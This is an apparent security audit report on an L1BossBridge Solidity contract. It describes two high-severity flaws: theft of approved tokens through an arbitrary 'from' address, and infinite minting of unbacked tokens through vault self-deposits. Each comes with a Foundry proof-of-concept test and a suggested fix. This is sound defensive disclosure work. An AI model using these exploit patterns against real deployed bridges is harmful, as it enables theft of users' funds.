Prince Allwin and team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Findings

## High

### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assest stolen

The `depositTokensToL2` function allows anyone to call it with a `from` address of any account that has approved tokens to the bridge.

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the `l2Recipient` parameter).

As a PoC, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanMoveApprovedTokensOfOtherUsers() public {
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    uint256 depositAmount = token.balanceOf(user);
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, attackerInL2, depositAmount);
    tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), depositAmount);
    vm.stopPrank();
}
```

Consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```

### [H-2] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens

`depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken.

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.

Additionally, they could mint all the tokens to themselves. 

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanTransferFromVaultToVault() public {
    vm.startPrank(attacker);

    // assume the vault already holds some tokens
    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    // Can trigger the `Deposit` event self-transferring tokens in the vault
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    // Any number of times
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    vm.stopPrank();
}
```

As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.
